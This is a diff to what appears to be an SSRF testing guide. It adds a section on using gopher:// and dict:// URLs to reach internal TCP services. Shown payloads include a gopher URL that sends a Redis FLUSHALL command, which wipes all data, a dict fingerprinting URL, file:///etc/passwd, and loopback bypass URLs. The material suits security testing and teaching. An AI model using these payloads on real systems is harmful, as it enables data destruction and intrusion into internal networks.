@@ -49,4 +49,15 @@ file:///etc/passwd
 - IPv6 loopback: `http://[::1]/`
 - Alternate representations: `http://127.0.0.1.nip.io/`, `http://0.0.0.0/`, embedding credentials `http://expected-host@127.0.0.1/`
 
+**Advanced: interacting with non-HTTP internal services**
+
+If the URL scheme isn't restricted, `gopher://` and `dict://` let you craft raw payloads sent byte-for-byte to arbitrary internal TCP services (Redis, Memcached, SMTP, etc.) — useful for turning SSRF into RCE or data exfiltration against services with no auth on the internal network:
+
+```text
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A   # raw Redis command via gopher
+dict://127.0.0.1:6379/info                                    # quick service fingerprinting via dict
+```
+
+Use [Gopherus](https://github.com/tarunkant/Gopherus) or [SSRFmap](https://github.com/swisskyrepo/SSRFmap) to generate these payloads for common services rather than crafting them by hand.
+
 **Impact to check for:** internal port scanning, reading cloud metadata credentials, hitting internal admin panels, pivoting to other internal services, and (with `file://` support) local file disclosure.
